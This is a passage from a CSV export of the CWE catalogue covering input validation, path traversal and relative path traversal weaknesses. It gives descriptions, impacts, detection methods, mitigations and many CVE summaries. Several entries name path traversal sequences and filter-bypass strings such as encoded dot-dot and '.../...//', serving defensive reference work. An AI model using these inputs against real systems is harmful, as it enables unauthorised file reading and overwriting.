request:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5285::REFERENCE:CVE-2008-3812:DESCRIPTION:router crashes with a malformed packet:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3812::REFERENCE:CVE-2008-3680:DESCRIPTION:packet with invalid version number leads to NULL pointer dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3680::REFERENCE:CVE-2008-3660:DESCRIPTION:crash via multiple . characters in file extension:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3660::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Input validation and representation::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR07-C:ENTRY NAME:Prefer functions that support error checking over equivalent functions that don't::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO30-C:ENTRY NAME:Exclude user input from format strings:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM10-C:ENTRY NAME:Define and use a pointer validation function::TAXONOMY NAME:WASC:ENTRY ID:20:ENTRY NAME:Improper Input Handling::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP25:ENTRY NAME:Tainted input to variable::\",::10::101::104::108::109::110::120::13::135::136::14::153::182::209::22::23::230::231::24::250::261::267::28::3::31::42::43::45::46::47::473::52::53::588::63::64::664::67::7::71::72::73::78::79::8::80::81::83::85::88::9::,\"::TYPE:Relationship:NOTE:CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.::TYPE:Maintenance:NOTE:As of 2020, this entry is used more often than preferred, and it is a source of frequent confusion. It is being actively modified for CWE 4.1 and subsequent versions.::TYPE:Maintenance:NOTE:Concepts such as validation, data transformation, and neutralization are being refined, so relationships between CWE-20 and other entries such as CWE-707 may change in future versions, along with an update to the Vulnerability Theory document.::TYPE:Maintenance:NOTE:Input validation - whether missing or incorrect - is such an essential and widespread part of secure development that it is implicit in many different weaknesses. Traditionally, problems such as buffer overflows and XSS have been classified as input validation problems by many security professionals. However, input validation is not necessarily the only protection mechanism available for avoiding such problems, and in some cases it is not even sufficient. The CWE team has begun capturing these subtleties in chains within the Research Concepts view (CWE-1000), but more work is needed.::TYPE:Terminology:NOTE:The input validation term is extremely common, but it is used in many different ways. In some cases its usage can obscure the real underlying weakness or otherwise hide chaining and composite relationships. Some people use input validation as a general term that covers many different neutralization techniques for ensuring that input is appropriate, such as filtering, canonicalization, and escaping. Others use the term in a more narrow context to simply mean checking if an input conforms to expectations without changing it. CWE uses this more narrow interpretation.::\",\n22,\"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\",Base,Stable,\"The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.\",\"Many file operations are intended to take place within a restricted directory. By using special elements such as .. and / separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the ../ sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as /usr/local/bin to access unexpected files. This is referred to as absolute path traversal.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:706:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1000::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Directory traversal::TERM:Path traversal:DESCRIPTION:Path traversal is preferred over directory traversal, but both terms are attack-focused.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:Integrity:IMPACT:Modify Files or Directories:NOTE:The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:Confidentiality:IMPACT:Read Files or Directories:NOTE:The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of protection mechanisms such as authentication, it has the potential to lock out product users.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated techniques can find areas where path traversal weaknesses exist. However, tuning or customization may be required to remove or de-prioritize path-traversal problems that are only exploitable by the product's administrator - or other privileged users - and thus potentially valid behavior or, at worst, a bug instead of a vulnerability.:EFFECTIVENESS:High::METHOD:Manual Static Analysis:DESCRIPTION:Manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all file access operations can be assessed within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Cost effective for partial coverage: Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked. Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59). This includes: realpath() in C getCanonicalPath() in Java GetFullPath() in ASP.NET realpath() or abs_path() in Perl realpath() in PHP::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::PHASE:Architecture and Design Operation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately. This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2024-37032:DESCRIPTION:Large language model (LLM) management tool does not validate the format of a digest value (CWE-1287) from a private, untrusted model registry, enabling relative path traversal (CWE-23), a.k.a. Probllama:LINK:https://www.cve.org/CVERecord?id=CVE-2024-37032::REFERENCE:CVE-2024-4315:DESCRIPTION:Chain: API for text generation using Large Language Models (LLMs) does not include the Windows folder separator in its denylist (CWE-184) when attempting to prevent Local File Inclusion via path traversal (CWE-22), allowing deletion of arbitrary files on Windows systems.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-4315::REFERENCE:CVE-2022-45918:DESCRIPTION:Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using ../ sequences (CWE-24):LINK:https://www.cve.org/CVERecord?id=CVE-2022-45918::REFERENCE:CVE-2019-20916:DESCRIPTION:Python package manager does not correctly restrict the filename specified in a Content-Disposition header, allowing arbitrary file read using path traversal sequences such as ../:LINK:https://www.cve.org/CVERecord?id=CVE-2019-20916::REFERENCE:CVE-2022-31503:DESCRIPTION:Python package constructs filenames using an unsafe os.path.join call on untrusted input, allowing absolute path traversal because os.path.join resets the pathname to an absolute path that is specified as part of the input.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-31503::REFERENCE:CVE-2022-24877:DESCRIPTION:directory traversal in Go-based Kubernetes operator app allows accessing data from the controller's pod file system via ../ sequences in a yaml file:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24877::REFERENCE:CVE-2021-21972:DESCRIPTION:Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21972::REFERENCE:CVE-2020-4053:DESCRIPTION:a Kubernetes package manager written in Go allows malicious plugins to inject path traversal sequences into a plugin archive (Zip slip) to copy a file outside the intended directory:LINK:https://www.cve.org/CVERecord?id=CVE-2020-4053::REFERENCE:CVE-2020-3452:DESCRIPTION:Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3452::REFERENCE:CVE-2019-10743:DESCRIPTION:Go-based archive library allows extraction of files to locations outside of the target folder with ../ path traversal sequences in filenames in a zip file, aka Zip Slip:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10743::REFERENCE:CVE-2010-0467:DESCRIPTION:Newsletter module allows reading arbitrary files using ../ sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0467::REFERENCE:CVE-2006-7079:DESCRIPTION:Chain: PHP app uses extract for register_globals compatibility layer (CWE-621), enabling path traversal (CWE-22):LINK:https://www.cve.org/CVERecord?id=CVE-2006-7079::REFERENCE:CVE-2009-4194:DESCRIPTION:FTP server allows deletion of arbitrary files using .. in the DELE command.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4194::REFERENCE:CVE-2009-4053:DESCRIPTION:FTP server allows creation of arbitrary directories using .. in the MKD command.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4053::REFERENCE:CVE-2009-0244:DESCRIPTION:FTP service for a Bluetooth device allows listing of directories, and creation or reading of files using .. sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0244::REFERENCE:CVE-2009-4013:DESCRIPTION:Software package maintenance program allows overwriting arbitrary files using ../ sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4013::REFERENCE:CVE-2009-4449:DESCRIPTION:Bulletin board allows attackers to determine the existence of files using the avatar.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4449::REFERENCE:CVE-2009-4581:DESCRIPTION:PHP program allows arbitrary code execution using .. in filenames that are fed to the include() function.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4581::REFERENCE:CVE-2010-0012:DESCRIPTION:Overwrite of files using a .. in a Torrent file.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0012::REFERENCE:CVE-2010-0013:DESCRIPTION:Chat program allows overwriting files using a custom smiley request.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0013::REFERENCE:CVE-2008-5748:DESCRIPTION:Chain: external control of values for user's desired language and theme enables path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5748::REFERENCE:CVE-2009-1936:DESCRIPTION:Chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1936::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Path Traversal::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A4:ENTRY NAME:Insecure Direct Object Reference:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A2:ENTRY NAME:Broken Access Control:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO02-C:ENTRY NAME:Canonicalize path names originating from untrusted sources::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:IDS00-PL:ENTRY NAME:Canonicalize path names before validating them:MAPPING FIT:Exact::TAXONOMY NAME:WASC:ENTRY ID:33:ENTRY NAME:Path Traversal::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-22::\",::126::64::76::78::79::,\"::TYPE:Other:NOTE:In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to apply to a wider range of files. For example, the product may add .txt to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.::TYPE:Relationship:NOTE:Pathname equivalence can be regarded as a type of canonicalization error.::TYPE:Relationship:NOTE:Some pathname equivalence issues are not directly related to directory traversal, rather are used to bypass security-relevant checks for whether a file/directory can be accessed by the attacker (e.g. a trailing / on a filename could bypass access rules that don't expect a trailing /, causing a server to provide the file when it normally would not).::TYPE:Terminology:NOTE:Like other weaknesses, terminology is often based on the types of manipulations used, instead of the underlying weaknesses. Some people use directory traversal only to refer to the injection of .. and equivalent sequences whose specific meaning is to traverse directories. Other variants like absolute pathname and drive letter have the *effect* of directory traversal, but some people may not call it such, since it doesn't involve .. or equivalent.::TYPE:Research Gap:NOTE:Many variants of path traversal attacks are probably under-studied with respect to root cause. CWE-790 and CWE-182 begin to cover part of this gap.::TYPE:Research Gap:NOTE:Incomplete diagnosis or reporting of vulnerabilities can make it difficult to know which variant is affected. For example, a researcher might say that .. is vulnerable, but not test ../ which may also be vulnerable. Any combination of directory separators (/, , etc.) and numbers of . (e.g. ....) can produce unique variants; for example, the //../ variant is not listed (CVE-2004-0325). See this entry's children and lower-level descendants.::\",\n23,\"Relative Path Traversal\",Base,Draft,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as .. that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.\",::NATURE:ChildOf:CWE ID:22:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:22:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:22:VIEW ID:1340:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Zip Slip:DESCRIPTION:Zip slip is an attack that uses file archives (e.g., ZIP, tar, rar, etc.) that contain filenames with path traversal sequences that cause the files to be written outside of the directory under which the archive is expected to be extracted [REF-1282]. It is most commonly used for relative path traversal (CWE-23) and link following (CWE-59).::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:Integrity:IMPACT:Modify Files or Directories:NOTE:The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:Confidentiality:IMPACT:Read Files or Directories:NOTE:The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked. Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59). This includes: realpath() in C getCanonicalPath() in Java GetFullPath() in ASP.NET realpath() or abs_path() in Perl realpath() in PHP::\",\"::REFERENCE:CVE-2024-37032:DESCRIPTION:Large language model (LLM) management tool does not validate the format of a digest value (CWE-1287) from a private, untrusted model registry, enabling relative path traversal (CWE-23), a.k.a. Probllama:LINK:https://www.cve.org/CVERecord?id=CVE-2024-37032::REFERENCE:CVE-2022-45918:DESCRIPTION:Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using ../ sequences (CWE-24):LINK:https://www.cve.org/CVERecord?id=CVE-2022-45918::REFERENCE:CVE-2019-20916:DESCRIPTION:Python package manager does not correctly restrict the filename specified in a Content-Disposition header, allowing arbitrary file read using path traversal sequences such as ../:LINK:https://www.cve.org/CVERecord?id=CVE-2019-20916::REFERENCE:CVE-2022-24877:DESCRIPTION:directory traversal in Go-based Kubernetes operator app allows accessing data from the controller's pod file system via ../ sequences in a yaml file:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24877::REFERENCE:CVE-2020-4053:DESCRIPTION:a Kubernetes package manager written in Go allows malicious plugins to inject path traversal sequences into a plugin archive (Zip slip) to copy a file outside the intended directory:LINK:https://www.cve.org/CVERecord?id=CVE-2020-4053::REFERENCE:CVE-2021-21972:DESCRIPTION:Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21972::REFERENCE:CVE-2019-10743:DESCRIPTION:Go-based archive library allows extraction of files to locations outside of the target folder with ../ path traversal sequences in filenames in a zip file, aka Zip Slip:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10743::REFERENCE:CVE-2002-0298:DESCRIPTION:Server allows remote attackers to cause a denial of service via certain HTTP GET requests containing a %2e%2e (encoded dot-dot), several /../ sequences, or several ../ in a URI.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0298::REFERENCE:CVE-2002-0661:DESCRIPTION:not in denylist for web server, allowing path traversal attacks when the server is run in Windows and other OSes.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0661::REFERENCE:CVE-2002-0946:DESCRIPTION:Arbitrary files may be read files via .. (dot dot) sequences in an HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0946::REFERENCE:CVE-2002-1042:DESCRIPTION:Directory traversal vulnerability in search engine for web server allows remote attackers to read arbitrary files via .. sequences in queries.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1042::REFERENCE:CVE-2002-1209:DESCRIPTION:Directory traversal vulnerability in FTP server allows remote attackers to read arbitrary files via .. sequences in a GET request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1209::REFERENCE:CVE-2002-1178:DESCRIPTION:Directory traversal vulnerability in servlet allows remote attackers to execute arbitrary commands via .. sequences in an HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1178::REFERENCE:CVE-2002-1987:DESCRIPTION:Protection mechanism checks for /.. but doesn't account for Windows-specific .. allowing read of arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1987::REFERENCE:CVE-2005-2142:DESCRIPTION:Directory traversal vulnerability in FTP server allows remote authenticated attackers to list arbitrary directories via a .. sequence in an LS command.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2142::REFERENCE:CVE-2002-0160:DESCRIPTION:The administration function in Access Control Server allows remote attackers to read HTML, Java class, and image files outside the web root via a .... sequence in the URL to port 2002.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0160::REFERENCE:CVE-2001-0467:DESCRIPTION:... in web server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0467::REFERENCE:CVE-2001-0963:DESCRIPTION:... in cd command in FTP server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0963::REFERENCE:CVE-2001-1193:DESCRIPTION:... in cd command in FTP server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1193::REFERENCE:CVE-2001-1131:DESCRIPTION:... in cd command in FTP server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1131::REFERENCE:CVE-2001-0480:DESCRIPTION:read of arbitrary files and directories using GET or CD with ... in Windows-based FTP server.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0480::REFERENCE:CVE-2002-0288:DESCRIPTION:read files using . and Unicode-encoded / or characters in the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0288::REFERENCE:CVE-2003-0313:DESCRIPTION:Directory listing of web server using ...:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0313::REFERENCE:CVE-2005-1658:DESCRIPTION:Triple dot:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1658::REFERENCE:CVE-2000-0240:DESCRIPTION:read files via /........../ in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0240::REFERENCE:CVE-2000-0773:DESCRIPTION:read files via .... in web server:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0773::REFERENCE:CVE-1999-1082:DESCRIPTION:read files via ...... in web server (doubled triple dot?):LINK:https://www.cve.org/CVERecord?id=CVE-1999-1082::REFERENCE:CVE-2004-2121:DESCRIPTION:read files via ...... in web server (doubled triple dot?):LINK:https://www.cve.org/CVERecord?id=CVE-2004-2121::REFERENCE:CVE-2001-0491:DESCRIPTION:multiple attacks using .., ..., and .... in different commands:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0491::REFERENCE:CVE-2001-0615:DESCRIPTION:... or .... in chat server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0615::REFERENCE:CVE-2005-2169:DESCRIPTION:chain: .../...// bypasses protection mechanism using regexp's that remove ../ resulting in collapse into an unsafe value ../ (CWE-182) and resultant path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2169::REFERENCE:CVE-2005-0202:DESCRIPTION:.../..../// bypasses regexp's that remove ./ and ../:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0202::REFERENCE:CVE-2004-1670:DESCRIPTION:Mail server allows remote attackers to create arbitrary directories via a .. or rename arbitrary files via a ....// in user supplied parameters.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1670::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Relative Path Traversal::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",::139::76::,\"\",\n24,\"Path Traversal: '../filedir'\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ../ sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The ../ manipulation is the canonical manipulation for operating systems that use / as directory separators, such as UNIX- and Linux-based systems. In some cases, it is useful for bypassing protection schemes in environments for which / is supported but not the primary separator, such as Windows, which uses but can also accept /.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE 